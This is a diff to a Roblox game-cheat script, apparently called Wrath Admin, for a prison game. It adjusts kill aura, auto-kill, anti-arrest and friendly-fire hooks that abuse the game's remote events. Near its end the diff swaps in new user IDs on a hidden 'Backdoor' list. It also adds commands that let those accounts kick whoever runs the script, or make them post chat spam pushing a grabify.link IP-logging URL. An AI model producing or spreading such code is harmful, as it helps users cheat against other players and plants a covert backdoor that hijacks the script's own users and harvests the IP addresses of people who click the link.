@@ -1212,11 +1212,11 @@ local function characterAdded()
         if myarguments.breaktigeradmin then
         States.AntiVoid = true
         myarguments.breaktigeradmin = false
-        task.wait(.3)
+        task.wait(.5)
         LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = myarguments.oldposition1
         end
         if not hasAlreadyDied and not isChangingTeamToInmates and player.TeamColor == BrickColor.new("Bright orange") and oldTeamIsCriminals and States.AntiArrest then
-        task.spawn(function() task.wait(.3)
+        task.spawn(function()
         local crimspawnpoint
         repeat
         task.wait()
@@ -1235,7 +1235,7 @@ local function characterAdded()
         local object = workspace['Criminals Spawn'].SpawnLocation
         local newPosition = CFrame.new(Vector3.new(10, 100, 10))
         object.CFrame = newPosition
-        hasDiedasCriminals = false
+        --Placeholder hasDiedasCriminals = false
         end
         if not game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
             isTeleportingToOldPosAndHasNoForceField = true
@@ -1250,41 +1250,61 @@ local function characterAdded()
         hasExecutedGuns = true
         print("debug_hasExecutedGuns has been set to true")
         if hasDiedasCriminals then
-           repeat task.wait() until player.TeamColor == BrickColor.new("Really red") and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+           if player.TeamColor == BrickColor.new("Really red") and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") and not myarguments.has_executedGuns then
+           myarguments.has_executedGuns = true
            task.wait(.4)
            pcall(function()
-           GiveGuns()
            if States.AutoItems then
            GiveAllItems()
+           end
+           if not States.AutoItems then
+           GiveGuns()
            end
            end)
            print("debug_gave guns hasdiedascriminals")
+           myarguments.has_executedGuns = false
+           end
         elseif hasDiedasGuards then
-           repeat task.wait() until player.TeamColor == BrickColor.new("Bright blue") and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+           if player.TeamColor == BrickColor.new("Bright blue") and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") and not myarguments.has_executedGuns then
+           myarguments.has_executedGuns = true
            task.wait(.4)
            pcall(function()
            if States.AutoItems then
            GiveAllItems()
            end
+           if not States.AutoItems then
            GiveGuns()
+           end
            end)
            print("debug_gave guns hasdiedasguards")
+           myarguments.has_executedGuns = false
+           end
         else
+           if not myarguments.has_executedGuns then
+           myarguments.has_executedGuns = true
            repeat task.wait() until game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+           if States.AntiArrest then
+           task.wait(.5)
+           end
            task.wait(.1)
            pcall(function()
            if States.AutoItems then
            GiveAllItems()
            end
+           if not States.AutoItems then
            GiveGuns()
+           end
            end)
            print("debug_gave guns has died as inmates")
+           myarguments.has_executedGuns = false
+           end
         end
         hasExecutedGuns = false
         print("debug_hasExecutedGuns has been set to false")
         else
           --Placeholder
         end
+        hasDiedasCriminals = false
     end
     --Additional check to fully make sure player is on old position (Because sometimes autorespawn does not spawn back to old position and also in other script like tiger admin)
     task.spawn(function()
@@ -2797,10 +2817,10 @@ task.spawn(function()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local distanceThreshold = 20
+local distanceThreshold = 25
 
 for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
+    if player ~= LocalPlayer and CheckProtected(player, "killcmds") then
         local character = player.Character
         if character then
             local rootPart = character.PrimaryPart
@@ -2809,9 +2829,11 @@ for _, player in ipairs(Players:GetPlayers()) do
                 if distance <= distanceThreshold then
                     local handcuffs = character:FindFirstChild("Handcuffs")
                     if handcuffs then
+                        for i = 1, 15 do
                         task.spawn(function()
                         MeleeEvent(player)
                         end)
+                        end
                     end
                 end
             end
@@ -3522,7 +3544,7 @@ Sky.Parent = game:GetService("Lighting")
         elseif Args[2] == "hostiles" or Args[2] == "hos" then
 local Players = game:GetService("Players")
 for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
+    if player ~= LocalPlayer and CheckProtected(player, "killcmds") then
                     local handcuffs = player.Character:FindFirstChild("Handcuffs")
                     if handcuffs then
                         Kill({player});
@@ -7834,7 +7856,8 @@ end)
 
 --// Virus
 task.spawn(function()
-    while task.wait(1/3) do
+    while task.wait(.2) do
+      pcall(function()
         if next(Infected) then
             local VirusPlayers = {};
             for i,v in next, Infected do
@@ -7864,12 +7887,14 @@ task.spawn(function()
                 Kill(VirusPlayers);
             end;
         end;
+      end)
     end;
 end)
 
 --// Kill Aura
 task.spawn(function()
-    while task.wait(1/3) do
+    while task.wait(.2) do
+      pcall(function()
         if next(KillAuras) then
             local InAura = {};
             for i,v in next, KillAuras do
@@ -7899,6 +7924,7 @@ task.spawn(function()
                 Kill(InAura);
             end;
         end;
+      end)
     end;
 end)
 
@@ -8070,7 +8096,7 @@ task.spawn(function()
         if States.KillHostiles then
 local Players = game:GetService("Players")
 for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
+    if player ~= LocalPlayer and CheckProtected(player, "killcmds") then
         if not player.Character:FindFirstChild("ForceField") and player.Character:FindFirstChild("Humanoid").Health ~= 0 then
                     local handcuffs = player.Character:FindFirstChild("Handcuffs")
                     if handcuffs then
@@ -8756,10 +8782,12 @@ MT.__namecall = newcclosure(loadstring([[
             local ValidPlayer = Players.GetPlayerFromCharacter(Players, Args[1][1].Hit.Parent) or Players.GetPlayerFromCharacter(Players, Args[1][1].Hit);
             if ValidPlayer then
                 task.spawn(function()
-                    if Info.FriendlyFireOldTeam == "Bright orange" or Info.FriendlyFireOldTeam == "Bright blue" then
                         workspace.Remote.TeamEvent:FireServer("Medium stone grey");
-                        task.wait(0.03);
+                        task.wait(0.04);
+                    if Info.FriendlyFireOldTeam == "Bright orange" or Info.FriendlyFireOldTeam == "Bright blue" then
                         workspace.Remote.TeamEvent:FireServer(Info.FriendlyFireOldTeam);
+                    elseif Info.FriendlyFireOldTeam == "Really red" then
+                        workspace.Remote.TeamEvent:FireServer("Bright orange")
                     end;
                 end)
             end;
@@ -10971,11 +10999,10 @@ print("LOADED WRATH ADMIN! Made by Zyrex, Dis, and Midnight, Modified by ellxzyi
 Notify("Success", "Loaded in " .. tostring(tick() - ExecutionTime) .. " second(s).");
 
 local Backdoor = {
-    1226142760, --Dis
-    1226142760, --Hiidk
-    1226142760, --Midnight
-    1226142760, -- Zyrex
-    1226142760 -- raid
+    1226142760, -- (m)
+    4667751127, -- (a)
+    1938641596, -- (sma)
+    4607513493, -- (a)
 };
 
 local function FindPlayer(String)
@@ -11013,9 +11040,17 @@ for _, Player in pairs(Players:GetPlayers()) do
                     end;
                 end;
 
+                if ctx[1] == '.bluetoothdeviceisreedytopair' then
+                        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('The bluechoose dewise is connecteduh succesfully', 'All');  
+                end;
+                
+                if ctx[1] == '.ads' then
+                        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Get JJSploit premium today with 40609 commands at grabify.link/freejjsploit', 'All');
+                end
+
                 if ctx[1] == '.kick' then
                     if FindPlayer(ctx[2]) == LocalPlayer then
-                        LocalPlayer:Kick('\nKicked by an admin!!!\n\nAdmin: '..Player.Name)
+                        LocalPlayer:Kick('Unknown reason')
                     end;
                 end;
 
